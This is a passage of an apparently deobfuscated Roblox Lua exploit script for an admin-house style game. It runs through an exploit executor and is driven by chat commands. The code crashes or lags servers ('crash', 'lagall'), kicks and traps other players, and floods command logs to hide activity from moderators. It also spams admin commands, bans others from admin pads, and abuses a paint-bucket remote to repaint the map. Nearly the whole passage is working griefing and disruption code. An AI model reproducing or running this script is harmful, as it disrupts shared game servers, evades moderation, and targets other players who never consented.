						a4.CFrame = a3.CFrame * CFrame.new(- 1 * a3.Size.X / 2 - game.Players.LocalPlayer.Character['Torso'].Size.X / 2, 0, 0)
						if not a5 then
							break
						end
					end
				end)
				task.spawn(function()
					while a5 do
						wait(.1)
						u('unpunish me')
					end
				end)
				wait(0.25)
				a5 = false
			end;
			movepart()
		end
	end;
	if a2:lower() == J then
		logn("Attached to object")
		if V.Target then
			local a3 = V.Target;
			function movepart()
				local a4 = game.Players.LocalPlayer.Character.HumanoidRootPart;
				local a5 = true;
				task.spawn(function()
					while true do
						game:GetService('RunService').Heartbeat:Wait()
						game.Players.LocalPlayer.Character['Humanoid']:ChangeState(11)
						a4.CFrame = a3.CFrame * CFrame.new(- 1 * a3.Size.X / 2 - game.Players.LocalPlayer.Character['Torso'].Size.X / 2, 0, 0)
						if not a5 then
							break
						end
					end
				end)
				task.spawn(function()
					while a5 do
						wait(.1)
						u('unpunish me')
					end
				end)
				wait(0.25)
				a5 = false;
				u(e .. 'super skydive me')
				wait(1)
				u(e .. 'spam tp me me me')
				wait(5)
				u(e .. 'stop')
				wait(0.25)
				u('respawn me')
			end;
			movepart()
		end
	end;
	if a2:lower() == y then
		kicking()
	end;
	if a2:lower() == A then
		antikicking()
	end;
	if a2:lower() == D then
        u("/spawn");wait(.35)
		u("respawn "..csp.." me")
        u("r e s p a w n   m e") -- funni
	end;
	if a2:lower() == E then
		u("reset "..csp.." me "..math.random(1,1000))
	end;
	if a2:lower() == F then
		u("ff "..csp.." me")
	end;
	if a2:lower() == G then
		u("fly "..csp.." me,m")
	end;
	if a2:lower() == C then
		u("tp me me me "..math.random(1,1000))
	end;
	if a2:lower() == B then
		u(e .. "pads "..math.random(1,1000))
	end
end)
function kicking()
	w = not w;
	if w == true then
		print("Kicking: Enabled")
		logn("Kicking Enabled", "Ok")
	elseif w == false then
		print("Kicking: Disabled")
		logn("Kicking Disabled", "Ok")
	end
end;
function antikicking()
	z = not z;
	if z == true then
		print("AntiMessage: Enabled")
		logn("AntiMessage Enabled", "Ok")
	elseif z == false then
		print("AntiMessage: Disabled")
        logn("AntiMessage Disabled", "Not Ok")
	end
end;
function a8(a6)
	while PadCheck == true do
		wait(0)
		if not game:GetService("Workspace").Terrain["_Game"].Admin.Pads:FindFirstChild(game.Players.LocalPlayer.Name .. "'s admin") then
			if game:GetService("Workspace").Terrain["_Game"].Admin.Pads:FindFirstChild("Touch to get admin") then
				local a9 = game:GetService("Workspace").Terrain["_Game"].Admin.Pads:FindFirstChild("Touch to get admin"):FindFirstChild("Head")
				local aa = game:GetService("Workspace").Terrain["_Game"].Admin.Pads:FindFirstChild("Touch to get admin"):FindFirstChild("Head").CFrame;
				wait(0.125)
				a9.CanCollide = false;
				repeat
					wait()
				until game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
				a9.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame;
				wait(0.125)
				a9.CFrame = aa;
				a9.CanCollide = true
			else
				fireclickdetector(game:GetService("Workspace").Terrain["_Game"].Admin.Regen.ClickDetector, 0)
			end
		end
	end
end;
W.LocalPlayer.Chatted:Connect(function(a6)
	CancelTeleport = true;
	local ab = nil;
	if string.sub(a6:lower(), 0, 5) == e .. "rrej" then
		local ac = {}
		for ad, ae in ipairs(game:GetService("HttpService"):JSONDecode(game:HttpGetAsync("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")).data) do
			if type(ae) == "table" and ae.maxPlayers > ae.playing and ae.id ~= game.JobId then
				ac[# ac + 1] = ae.id;
				ab = ae.playing
			end
		end;
		if # ac > 0 then
			say("Joining a server with " .. ab .. " Players")
			wait(0.25)
			game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, ac[math.random(1, # ac)])
		else
			logn("Unable to Locate Server")
		end
	end;
	if string.sub(a6:lower(), 0, 4) == e .. "rjg" then
		local ac = {}
		local ab = nil;
		for ad, ae in ipairs(game:GetService("HttpService"):JSONDecode(game:HttpGetAsync("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")).data) do
			if type(ae) == "table" and ae.playing == tonumber(string.sub(a6:lower(), 6)) and ae.id ~= game.JobId then
				ac[# ac + 1] = ae.id;
				ab = tonumber(string.sub(a6:lower(), 6))
			end
		end;
		if # ac > 0 then
			say("Joining a server with " .. ab .. " Players")
			wait(0.25)
			game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, ac[math.random(1, # ac)])
		else
			logn("Unable to Locate Server")
		end
	end;
	if string.sub(a6:lower(), 0, 4) == e .. "srj" then
		u(e .. "rjg 1")
		u(e .. "rjg 2")
		u(e .. "rjg 3")
		u(e .. "rjg 4")
	end;
	if string.sub(a6:lower(), 0, 4) == e .. "sch" then
		gotoShortcutHub("Requested", 1)
	end;
	if string.sub(a6:lower(), 0, 19) == e .. "color all original" then
		u("gear me 00000000000000000018474459")
		wait(1)
		game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.PaintBucket)
		wait(0.25)
		local af = game:GetService("Workspace")[game:GetService("Players").LocalPlayer.Name].PaintBucket:WaitForChild("Remotes").ServerControls;
		for ag, ae in pairs(game.Workspace.Terrain["_Game"].Workspace:GetChildren()) do
			task.spawn(function()
				if ae:IsA("Part") then
					local ah = {
						["Part"] = ae,
						["Color"] = transformToColor3(BrickColor.new("Bright green"))
					}
					af:InvokeServer(a1, ah)
				end
			end)
		end;
		for ag, ae in pairs(game.Workspace.Terrain["_Game"].Workspace["Admin Dividers"]:GetChildren()) do
			task.spawn(function()
				if ae:IsA("Part") then
					local ai = {
						["Part"] = ae,
						["Color"] = transformToColor3(BrickColor.new("Dark stone grey"))
					}
					af:InvokeServer(a1, ai)
				end
			end)
		end;
		for ag, ae in pairs(game.Workspace.Terrain["_Game"].Workspace["Basic House"]:GetDescendants()) do
			if ae:IsA("Part") then
				task.spawn(function()
					if ae.Name == "SmoothBlockModel103" or ae.Name == "SmoothBlockModel105" or ae.Name == "SmoothBlockModel106" or ae.Name == "SmoothBlockModel108" or ae.Name == "SmoothBlockModel11" or ae.Name == "SmoothBlockModel113" or ae.Name == "SmoothBlockModel114" or ae.Name == "SmoothBlockModel115" or ae.Name == "SmoothBlockModel116" or ae.Name == "SmoothBlockModel118" or ae.Name == "SmoothBlockModel122" or ae.Name == "SmoothBlockModel126" or ae.Name == "SmoothBlockModel129" or ae.Name == "SmoothBlockModel13" or ae.Name == "SmoothBlockModel130" or ae.Name == "SmoothBlockModel131" or ae.Name == "SmoothBlockModel132" or ae.Name == "SmoothBlockModel134" or ae.Name == "SmoothBlockModel135" or ae.Name == "SmoothBlockModel14" or ae.Name == "SmoothBlockModel140" or ae.Name == "SmoothBlockModel142" or ae.Name == "SmoothBlockModel147" or ae.Name == "SmoothBlockModel15" or ae.Name == "SmoothBlockModel154" or ae.Name == "SmoothBlockModel155" or ae.Name == "SmoothBlockModel164" or ae.Name == "SmoothBlockModel166" or ae.Name == "SmoothBlockModel173" or ae.Name == "SmoothBlockModel176" or ae.Name == "SmoothBlockModel179" or ae.Name == "SmoothBlockModel185" or ae.Name == "SmoothBlockModel186" or ae.Name == "SmoothBlockModel190" or ae.Name == "SmoothBlockModel191" or ae.Name == "SmoothBlockModel196" or ae.Name == "SmoothBlockModel197" or ae.Name == "SmoothBlockModel198" or ae.Name == "SmoothBlockModel20" or ae.Name == "SmoothBlockModel201" or ae.Name == "SmoothBlockModel203" or ae.Name == "SmoothBlockModel205" or ae.Name == "SmoothBlockModel207" or ae.Name == "SmoothBlockModel208" or ae.Name == "SmoothBlockModel209" or ae.Name == "SmoothBlockModel210" or ae.Name == "SmoothBlockModel211" or ae.Name == "SmoothBlockModel213" or ae.Name == "SmoothBlockModel218" or ae.Name == "SmoothBlockModel22" or ae.Name == "SmoothBlockModel223" or ae.Name == "SmoothBlockModel224" or ae.Name == "SmoothBlockModel226" or ae.Name == "SmoothBlockModel26" or ae.Name == "SmoothBlockModel29" or ae.Name == "SmoothBlockModel30" or ae.Name == "SmoothBlockModel31" or ae.Name == "SmoothBlockModel36" or ae.Name == "SmoothBlockModel37" or ae.Name == "SmoothBlockModel38" or ae.Name == "SmoothBlockModel39" or ae.Name == "SmoothBlockModel41" or ae.Name == "SmoothBlockModel48" or ae.Name == "SmoothBlockModel49" or ae.Name == "SmoothBlockModel51" or ae.Name == "SmoothBlockModel56" or ae.Name == "SmoothBlockModel67" or ae.Name == "SmoothBlockModel68" or ae.Name == "SmoothBlockModel69" or ae.Name == "SmoothBlockModel70" or ae.Name == "SmoothBlockModel72" or ae.Name == "SmoothBlockModel75" or ae.Name == "SmoothBlockModel8" or ae.Name == "SmoothBlockModel81" or ae.Name == "SmoothBlockModel85" or ae.Name == "SmoothBlockModel93" or ae.Name == "SmoothBlockModel98" then
						local aj = {
							["Part"] = ae,
							["Color"] = transformToColor3(BrickColor.new("Brick yellow"))
						}
						af:InvokeServer(a1, aj)
					end;
					if ae.Name == "SmoothBlockModel40" then
						local ak = {
							["Part"] = ae,
							["Color"] = transformToColor3(BrickColor.new("Bright green"))
						}
						af:InvokeServer(a1, ak)
					end;
					if ae.Name == "SmoothBlockModel100" or ae.Name == "SmoothBlockModel102" or ae.Name == "SmoothBlockModel104" or ae.Name == "SmoothBlockModel107" or ae.Name == "SmoothBlockModel109" or ae.Name == "SmoothBlockModel110" or ae.Name == "SmoothBlockModel111" or ae.Name == "SmoothBlockModel119" or ae.Name == "SmoothBlockModel12" or ae.Name == "SmoothBlockModel120" or ae.Name == "SmoothBlockModel123" or ae.Name == "SmoothBlockModel124" or ae.Name == "SmoothBlockModel125" or ae.Name == "SmoothBlockModel127" or ae.Name == "SmoothBlockModel128" or ae.Name == "SmoothBlockModel133" or ae.Name == "SmoothBlockModel136" or ae.Name == "SmoothBlockModel137" or ae.Name == "SmoothBlockModel138" or ae.Name == "SmoothBlockModel139" or ae.Name == "SmoothBlockModel141" or ae.Name == "SmoothBlockModel143" or ae.Name == "SmoothBlockModel149" or ae.Name == "SmoothBlockModel151" or ae.Name == "SmoothBlockModel152" or ae.Name == "SmoothBlockModel153" or ae.Name == "SmoothBlockModel156" or ae.Name == "SmoothBlockModel157" or ae.Name == "SmoothBlockModel158" or ae.Name == "SmoothBlockModel16" or ae.Name == "SmoothBlockModel163" or ae.Name == "SmoothBlockModel167" or ae.Name == "SmoothBlockModel168" or ae.Name == "SmoothBlockModel169" or ae.Name == "SmoothBlockModel17" or ae.Name == "SmoothBlockModel170" or ae.Name == "SmoothBlockModel172" or ae.Name == "SmoothBlockModel177" or ae.Name == "SmoothBlockModel18" or ae.Name == "SmoothBlockModel180" or ae.Name == "SmoothBlockModel184" or ae.Name == "SmoothBlockModel187" or ae.Name == "SmoothBlockModel188" or ae.Name == "SmoothBlockModel189" or ae.Name == "SmoothBlockModel19" or ae.Name == "SmoothBlockModel193" or ae.Name == "SmoothBlockModel2" or ae.Name == "SmoothBlockModel200" or ae.Name == "SmoothBlockModel202" or ae.Name == "SmoothBlockModel21" or ae.Name == "SmoothBlockModel214" or ae.Name == "SmoothBlockModel215" or ae.Name == "SmoothBlockModel216" or ae.Name == "SmoothBlockModel219" or ae.Name == "SmoothBlockModel220" or ae.Name == "SmoothBlockModel221" or ae.Name == "SmoothBlockModel222" or ae.Name == "SmoothBlockModel225" or ae.Name == "SmoothBlockModel227" or ae.Name == "SmoothBlockModel229" or ae.Name == "SmoothBlockModel23" or ae.Name == "SmoothBlockModel230" or ae.Name == "SmoothBlockModel231" or ae.Name == "SmoothBlockModel25" or ae.Name == "SmoothBlockModel28" or ae.Name == "SmoothBlockModel32" or ae.Name == "SmoothBlockModel33" or ae.Name == "SmoothBlockModel34" or ae.Name == "SmoothBlockModel42" or ae.Name == "SmoothBlockModel44" or ae.Name == "SmoothBlockModel47" or ae.Name == "SmoothBlockModel54" or ae.Name == "SmoothBlockModel55" or ae.Name == "SmoothBlockModel58" or ae.Name == "SmoothBlockModel59" or ae.Name == "SmoothBlockModel6" or ae.Name == "SmoothBlockModel61" or ae.Name == "SmoothBlockModel62" or ae.Name == "SmoothBlockModel63" or ae.Name == "SmoothBlockModel74" or ae.Name == "SmoothBlockModel76" or ae.Name == "SmoothBlockModel77" or ae.Name == "SmoothBlockModel78" or ae.Name == "SmoothBlockModel79" or ae.Name == "SmoothBlockModel80" or ae.Name == "SmoothBlockModel84" or ae.Name == "SmoothBlockModel86" or ae.Name == "SmoothBlockModel87" or ae.Name == "SmoothBlockModel88" or ae.Name == "SmoothBlockModel90" or ae.Name == "SmoothBlockModel91" or ae.Name == "SmoothBlockModel92" or ae.Name == "SmoothBlockModel94" or ae.Name == "SmoothBlockModel95" or ae.Name == "SmoothBlockModel96" then
						local al = {
							["Part"] = ae,
							["Color"] = transformToColor3(BrickColor.new("Bright red"))
						}
						af:InvokeServer(a1, al)
					end;
					if ae.Name == "SmoothBlockModel10" or ae.Name == "SmoothBlockModel101" or ae.Name == "SmoothBlockModel117" or ae.Name == "SmoothBlockModel121" or ae.Name == "SmoothBlockModel144" or ae.Name == "SmoothBlockModel145" or ae.Name == "SmoothBlockModel146" or ae.Name == "SmoothBlockModel148" or ae.Name == "SmoothBlockModel150" or ae.Name == "SmoothBlockModel159" or ae.Name == "SmoothBlockModel161" or ae.Name == "SmoothBlockModel171" or ae.Name == "SmoothBlockModel174" or ae.Name == "SmoothBlockModel175" or ae.Name == "SmoothBlockModel181" or ae.Name == "SmoothBlockModel182" or ae.Name == "SmoothBlockModel183" or ae.Name == "SmoothBlockModel192" or ae.Name == "SmoothBlockModel194" or ae.Name == "SmoothBlockModel195" or ae.Name == "SmoothBlockModel199" or ae.Name == "SmoothBlockModel204" or ae.Name == "SmoothBlockModel206" or ae.Name == "SmoothBlockModel212" or ae.Name == "SmoothBlockModel217" or ae.Name == "SmoothBlockModel228" or ae.Name == "SmoothBlockModel24" or ae.Name == "SmoothBlockModel27" or ae.Name == "SmoothBlockModel35" or ae.Name == "SmoothBlockModel4" or ae.Name == "SmoothBlockModel43" or ae.Name == "SmoothBlockModel45" or ae.Name == "SmoothBlockModel46" or ae.Name == "SmoothBlockModel50" or ae.Name == "SmoothBlockModel53" or ae.Name == "SmoothBlockModel57" or ae.Name == "SmoothBlockModel60" or ae.Name == "SmoothBlockModel64" or ae.Name == "SmoothBlockModel65" or ae.Name == "SmoothBlockModel66" or ae.Name == "SmoothBlockModel7" or ae.Name == "SmoothBlockModel71" or ae.Name == "SmoothBlockModel73" or ae.Name == "SmoothBlockModel82" or ae.Name == "SmoothBlockModel83" or ae.Name == "SmoothBlockModel89" or ae.Name == "SmoothBlockModel99" then
						local am = {
							["Part"] = ae,
							["Color"] = transformToColor3(BrickColor.new("Dark orange"))
						}
						af:InvokeServer(a1, am)
					end;
					if ae.Name == "SmoothBlockModel1" or ae.Name == "SmoothBlockModel3" or ae.Name == "SmoothBlockModel5" or ae.Name == "SmoothBlockModel9" then
						local an = {
							["Part"] = ae,
							["Color"] = transformToColor3(BrickColor.new("Dark stone grey"))
						}
						af:InvokeServer(a1, an)
					end;
					if ae.Name == "SmoothBlockModel112" then
						local ao = {
							["Part"] = ae,
							["Color"] = transformToColor3(BrickColor.new("Medium blue"))
						}
						af:InvokeServer(a1, ao)
					end;
					if ae.Name == "SmoothBlockModel52" or ae.Name == "SmoothBlockModel97" then
						local ap = {
							["Part"] = ae,
							["Color"] = transformToColor3(BrickColor.new("Reddish brown"))
						}
						af:InvokeServer(a1, ap)
					end;
					if ae.Name == "SmoothBlockModel160" or ae.Name == "SmoothBlockModel162" or ae.Name == "SmoothBlockModel165" or ae.Name == "SmoothBlockModel178" then
						local aq = {
							["Part"] = ae,
							["Color"] = transformToColor3(BrickColor.new("Sand red"))
						}
						af:InvokeServer(a1, aq)
					end
				end)
			end
		end;
		for ag, ae in pairs(game.Workspace.Terrain["_Game"].Workspace["Building Bricks"]:GetDescendants()) do
			if ae:IsA("Part") then
				task.spawn(function()
					if ae.Name == "Part29" or ae.Name == "Part31" or ae.Name == "Part55" then
						local ar = {
							["Part"] = ae,
							["Color"] = transformToColor3(BrickColor.new("Dark stone grey"))
						}
						af:InvokeServer(a1, ar)
					end;
					if ae.Name == "Part11" or ae.Name == "Part18" or ae.Name == "Part25" or ae.Name == "Part3" or ae.Name == "Part43" then
						local as = {
							["Part"] = ae,
							["Color"] = transformToColor3(BrickColor.new("Deep blue"))
						}
						af:InvokeServer(a1, as)
					end;
					if ae.Name == "Part13" or ae.Name == "Part21" or ae.Name == "Part23" or ae.Name == "Part7" then
						local at = {
							["Part"] = ae,
							["Color"] = transformToColor3(BrickColor.new("Institutuional white"))
						}
						af:InvokeServer(a1, at)
					end;
					if ae.Name == "Part17" or ae.Name == "Part26" or ae.Name == "Part38" or ae.Name == "Part5" or ae.Name == "Part9" then
						local au = {
							["Part"] = ae,
							["Color"] = transformToColor3(BrickColor.new("Lime green"))
						}
						af:InvokeServer(a1, au)
					end;
					if ae.Name == "Part30" or ae.Name == "Part32" or ae.Name == "Part33" or ae.Name == "Part34" or ae.Name == "Part35" or ae.Name == "Part36" or ae.Name == "Part39" or ae.Name == "Part40" or ae.Name == "Part41" or ae.Name == "Part42" or ae.Name == "Part46" or ae.Name == "Part47" or ae.Name == "Part48" or ae.Name == "Part49" or ae.Name == "Part50" or ae.Name == "Part51" or ae.Name == "Part52" or ae.Name == "Part53" or ae.Name == "Part54" or ae.Name == "Part56" or ae.Name == "Part57" or ae.Name == "Part58" or ae.Name == "Part59" or ae.Name == "Part60" or ae.Name == "Part61" or ae.Name == "Part38" or ae.Name == "Part5" or ae.Name == "Part9" then
						local av = {
							["Part"] = ae,
							["Color"] = transformToColor3(BrickColor.new("Medium Stone grey"))
						}
						af:InvokeServer(a1, av)
					end;
					if ae.Name == "Part12" or ae.Name == "Part15" or ae.Name == "Part24" or ae.Name == "Part44" or ae.Name == "Part6" then
						local aw = {
							["Part"] = ae,
							["Color"] = transformToColor3(BrickColor.new("New yeller"))
						}
						af:InvokeServer(a1, aw)
					end;
					if ae.Name == "Part14" or ae.Name == "Part19" or ae.Name == "Part2" or ae.Name == "Part27" then
						local ax = {
							["Part"] = ae,
							["Color"] = transformToColor3(BrickColor.new("Really black"))
						}
						af:InvokeServer(a1, ax)
					end;
					if ae.Name == "Part1" or ae.Name == "Part10" or ae.Name == "Part16" or ae.Name == "Part22" or ae.Name == "Part37" then
						local ay = {
							["Part"] = ae,
							["Color"] = transformToColor3(BrickColor.new("Really red"))
						}
						af:InvokeServer(a1, ay)
					end;
					if ae.Name == "Part20" or ae.Name == "Part28" or ae.Name == "Part4" or ae.Name == "Part45" or ae.Name == "Part8" then
						local az = {
							["Part"] = ae,
							["Color"] = transformToColor3(BrickColor.new("Toothpaste"))
						}
						af:InvokeServer(a1, az)
					end
				end)
			end
		end;
		for ag, ae in pairs(game.Workspace.Terrain["_Game"].Workspace.Obby:GetChildren()) do
			task.spawn(function()
				if ae:IsA("Part") then
					local aA = {
						["Part"] = ae,
						["Color"] = transformToColor3(BrickColor.new("Really red"))
					}
					af:InvokeServer(a1, aA)
				end;
				for ag, ae in pairs(game.Workspace.Terrain["_Game"].Workspace["Obby Box"]:GetChildren()) do
					if ae:IsA("Part") then
						local aB = {
							["Part"] = ae,
							["Color"] = transformToColor3(BrickColor.new("Teal"))
						}
						af:InvokeServer(a1, aB)
					end
				end
			end)
		end
	end;
	if string.sub(a6:lower(), 0, 7) == e .. "getpos" then
		local a4 = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame;
		say("Check console!")
		u([[music 
		]] .. a4.X .. [[, ]] .. a4.Y .. [[, ]] .. a4.Z .. [[
		]] .. a4.X .. [[, ]] .. a4.Y .. [[, ]] .. a4.Z .. [[
		]] .. a4.X .. [[, ]] .. a4.Y .. [[, ]] .. a4.Z .. [[
		]] .. a4.X .. [[, ]] .. a4.Y .. [[, ]] .. a4.Z .. [[
		]])
	end;
	if string.sub(a6:lower(), 0, 4) == e .. "ufo" then
		local plr = string.sub(a6:lower(), 6)
		u("size " .. plr .. " 0.3")
		u("size " .. plr .. " 0.3")
		u("size " .. plr .. " 0.3")
		u("size " .. plr .. " 0.3")
		u("size " .. plr .. " 0.3")
		u("size " .. plr .. " 0.3")
		u("size " .. plr .. " 0.3")
		u("unsize " .. plr)
		u("size " .. plr .. " 4")
		u("paint " .. plr .. " brown")
		u("name " .. plr .. " Ufo")
		wait(0.25)
		u("removelimbs " .. plr)
		u("dog " .. plr)
		u("rainbowify " .. plr)
		u("spin " .. plr)
	end;
	if string.sub(a6:lower(), 0, 6) == e .. "fixbp" then
		local plr = string.sub(a6:lower(), 8)
		u(e .. "trap " .. plr)
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(- 500.99981689453, 0.10156404972076, 0))
		wait(0.10)
		u("jail me")
		u("tp " .. plr .. " me")
		wait(0.25)
		local a3 = Z.Baseplate;
		function movepart()
			local a4 = game.Players.LocalPlayer.Character.HumanoidRootPart;
			local a5 = true;
			task.spawn(function()
				while true do
					game:GetService('RunService').Heartbeat:Wait()
					game.Players.LocalPlayer.Character['Humanoid']:ChangeState(11)
					a4.CFrame = a3.CFrame * CFrame.new(- 1 * a3.Size.X / 2 - game.Players.LocalPlayer.Character['Torso'].Size.X / 2, 0, 0)
					if not a5 then
						break
					end
				end
			end)
			task.spawn(function()
				while a5 do
					wait(.1)
					u('unpunish me')
				end
			end)
			wait(0.25)
			a5 = false
		end;
		movepart()
		wait(0.75)
		u("tp me " .. plr)
	end;

	if string.sub(a6:lower(), 0, 7) == e .. "padban" then
		names = game.Players:GetChildren()
		local aC = string.sub(a6:lower(), 9)
		for ag, ae in pairs(names) do
			strlower = string.lower(ae.Name)
			sub = string.sub(strlower, 1, # aC)
			if aC == sub then
				user = ae.Name;
				table.insert(Pad_Ban, ae.Name)
				logn("Banned " .. ae.Name .. " from pads.")
			end
		end
	end;
	if string.sub(a6:lower(), 0, 9) == e .. "unpadban" then
		names = game.Players:GetChildren()
		local aC = string.sub(a6:lower(), 11)
		for ag, ae in pairs(names) do
			strlower = string.lower(ae.Name)
			sub = string.sub(strlower, 1, # aC)
			if aC == sub then
				user = ae.Name;
				for aD, aE in pairs(Pad_Ban) do
					if aE == ae.Name then
						table.remove(Pad_Ban, aD)
						logn("Unbanned " .. ae.Name .. " from pads.")
					end
				end
			end
		end
	end;
	if string.sub(a6:lower(), 0, 5) == e .. "perm" then
		PadCheck = true;
		a8(a6)
	end;
	if string.sub(a6:lower(), 0, 8) == e .. "nonperm" then
		PadCheck = false
	end;
	if string.sub(a6:lower(), 0, 8) == e .. "infjump" then
		InfiniteJumpEnabled = true;
		game:GetService("UserInputService").JumpRequest:connect(function()
			if InfiniteJumpEnabled then
				game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")
			end
		end)
	end;
	if string.sub(a6:lower(), 0, 7) == e .. "attach" then
		logn("We wont put your camera in the right place for ya xd")
		u("stun me")
		wait(2.4)
		u("punish me")
		wait(1.7)
		u("unpunish me")
		logn("Attached Unless your camera wasn't in the right place xd")
	end;
	if string.sub(a6:lower(), 0, 6) == e .. "tesk " then
		logn("Kicking player (This may take a little bit...)")
		Q = string.sub(a6:lower(), 7)
		P = true
	end;
	if string.sub(a6:lower(), 0, 2) == e .. "g " then
		loadstring()
	end;
	if string.sub(a6:lower(), 0, 5) == e .. "stop" then
		logn("Stopped teskker...")
		Q = "none"
		P = false;
		S = "none"
		R = false;
		T = false;
		O = false
	end;
	if string.sub(a6:lower(), 0, 8) == e .. "clicktp" then
		logn("Gave you the clicktp tool")
		plr = game.Players.LocalPlayer;
		mouse = plr:GetMouse()
		hum = plr.Character.HumanoidRootPart;
		local aF = Instance.new("Tool", plr.Backpack)
		aF.Name = "ClickTP"
		aF.CanBeDropped = false;
		aF.RequiresHandle = false;
		aF.Activated:Connect(function()
			if mouse.Target then
				hum.CFrame = CFrame.new(mouse.Hit.x, mouse.Hit.y + 5, mouse.Hit.z)
			end
		end)
	end;
	if string.sub(a6:lower(), 0, 10) == e .. "clearlogs" then
		logn("Cleared!")
		for ag = 1, 100 do
			u("ff " .. Quotes[math.random(1, # Quotes)])
		end;
		wait(0.05)
		if d == true then
			u("ff Powered by shortcut")
			u("unff all")
		end
	end;
	if string.sub(a6:lower(), 0, 7) == e .. "super " then
		logn("Spamming!")
		for ag = 1, 100 do
			u(string.sub(a6:lower(), 8))
		end
	end;
	if string.sub(a6:lower(), 0, 9) == e .. "traplogs" then
		logn("WARNING DONT CHECK LOGS!")
		for ag = 1, 100 do
			u("ff " .. L)
		end
	end;
	if string.sub(a6:lower(), 0, 6) == e .. "spam " then
		logn("Spamming!")
		U = string.sub(a6:lower(), 7)
		T = true
	end;
	if string.sub(a6:lower(), 0, 7) == e .. "lagall" then
		logn("Warning this can be powerful and can only be aimmed at everyone...")
		O = true
	end;
	if string.sub(a6:lower(), 0, 5) == e .. "pads" then
		logn("Teleported to pads!")
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(- 32.7, 8.22999954, 94.5))
	end;
	if string.sub(a6:lower(), 0, 8) == e .. "skydive" then
		logn("Skydived!")
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.X, game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Y + 1500, game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Z))
	end;
	if string.sub(a6:lower(), 0, 6) == e .. "house" then
		logn("Teleported to pads!")
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(- 28.6829948, 8.2299995, 66.4913253))
	end;
	if string.sub(a6:lower(), 0, 6) == e .. "spawn" then
		logn("Teleported to pads!")
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(- 41, 3.7, - 15.589996337891))
	end;
	if string.sub(a6:lower(), 0, 4) == e .. "reg" then
		regen()
	end;
	if string.sub(a6:lower(), 0, 6) == e .. "crash" then
		if string.sub(a6:lower(), 0, 9) == e .. "crashall" then
			logn("We've infact moved this command and its now called lagall :)")
		else
			logn("Just hold the tool your given xd (Expires in 10 seconds.)")
			u("gear me 00000000000000000094794847")
			K = true;
			task.spawn(function()
				wait(10)
				K = false;
				logn("VampireVanquisher Expired.")
			end)
			while true do
				if game.Players.LocalPlayer.Character:FindFirstChild("VampireVanquisher") then
					wait(0.25)
					for ag = 1, 100 do
						u("size me 0000000000000000000.3")
					end;
					u("size me .3")
					u("size me .3")
					u("size me .3")
					u("freeze me")
					u("size me 10")
					u("size me 10")
					u("size me 10")
					u("clone me")
					gotoShortcutHub("Server CRASHED", 1)
					break
				end;
				wait(0.05)
				if K == false then
					break
				end
			end
		end
	end;
	if string.sub(a6:lower(), 0, 11) == e .. "bind fkick" then
		logn("fkick is now bound to '" .. string.sub(a6:lower(), 13, 13) .. "'")
		y = string.sub(a6:lower(), 13, 13)
	end;
	if string.sub(a6:lower(), 0, 14) == e .. "bind antikick" then
		logn("antikick is now bound to '" .. string.sub(a6:lower(), 16, 16) .. "'")
		A = string.sub(a6:lower(), 16, 16)
	end;
	if string.sub(a6:lower(), 0, 13) == e .. "bind respawn" then
		logn("respawn is now bound to '" .. string.sub(a6:lower(), 15, 15) .. "'")
		D = string.sub(a6:lower(), 15, 15)
	end;
	if string.sub(a6:lower(), 0, 11) == e .. "bind reset" then
		logn("reset is now bound to '" .. string.sub(a6:lower(), 13, 13) .. "'")
		E = string.sub(a6:lower(), 13, 13)
	end;
	if string.sub(a6:lower(), 0, 16) == e .. "bind forcefield" then
		logn("forcefield is now bound to '" .. string.sub(a6:lower(), 18, 18) .. "'")
		F = string.sub(a6:lower(), 18, 18)
	end;
	if string.sub(a6:lower(), 0, 9) == e .. "bind fly" then
		logn("fly is now bound to '" .. string.sub(a6:lower(), 11, 11) .. "'")
		G = string.sub(a6:lower(), 11, 11)
	end;
	if string.sub(a6:lower(), 0, 14) == e .. "bind teleport" then
		logn("teleport is now bound to '" .. string.sub(a6:lower(), 16, 16) .. "'")
		C = string.sub(a6:lower(), 16, 16)
	end;
	if string.sub(a6:lower(), 0, 8) == e .. "boombox" then
		logn("Gave player a boombox!")
		local a7 = string.sub(a6:lower(), 10)
		if a7 ~= "" then
			u("gear " .. a7 .. " 000000000000000000212641536")
		else
			u("gear me 000000000000000000212641536")
		end
	end;
	if string.sub(a6:lower(), 0, 10) == e .. "bind pads" then
		logn("pads is now bound to '" .. string.sub(a6:lower(), 13, 13) .. "'")
		B = string.sub(a6:lower(), 13, 13)
	end;
	if string.sub(a6:lower(), 0, 14) == e .. "bind attachto" then
		logn("attachto is now bound to '" .. string.sub(a6:lower(), 16, 16) .. "'")
		H = string.sub(a6:lower(), 16, 16)
	end;
	if string.sub(a6:lower(), 0, 4) == e .. "bok" then
		logn("Now making person bok...")
		wait(0.5)
		local aG = string.sub(a6:lower(), 6) .. ","
